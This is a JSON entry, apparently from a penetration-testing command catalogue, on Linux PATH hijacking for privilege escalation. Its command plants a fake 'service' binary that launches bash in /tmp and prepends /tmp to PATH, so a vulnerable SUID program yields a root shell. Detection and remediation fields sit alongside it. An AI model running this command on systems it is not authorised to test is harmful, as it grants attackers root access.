  {
    "id": "linux-path-hijack",
    "tool": "manual",
    "category": "privilege_escalation",
    "phase": 6,
    "os": [
      "linux"
    ],
    "command": "echo '/bin/bash' > /tmp/service && chmod +x /tmp/service && export PATH=/tmp:$PATH",
    "name": "PATH Hijacking",
    "description": "If a SUID/root program calls a command without full path, hijack it via PATH manipulation.",
    "arguments": {
      "echo": "Create fake binary",
      "export PATH": "Prepend writable directory"
    },
    "expected_output": "# When vulnerable SUID binary runs 'service':\n# It executes /tmp/service (our bash) as root",
    "use_case": "Exploit programs that call commands without absolute paths.",
    "prerequisites": [
      "SUID binary calling relative command",
      "Writable directory in PATH"
    ],
    "mitre_mapping": [
      "T1574.007"
    ],
    "mitre_tactic": "Privilege Escalation",
    "detections": [
      "Unusual PATH modifications",
      "Binary execution from /tmp"
    ],
    "remediation": [
      "Use absolute paths in scripts",
      "Restrict PATH in SUID binaries"
    ],
    "common_mistakes": [
      "Binary uses absolute paths",
      "Can't modify PATH for SUID"
    ],
    "alternatives": [
      "linpeas",
      "strings <binary> (find relative calls)"
    ],
    "references": [
      "https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation"
    ],
    "tags": [
      "path",
      "hijack",
      "suid",
      "linux",
      "environment"
    ]
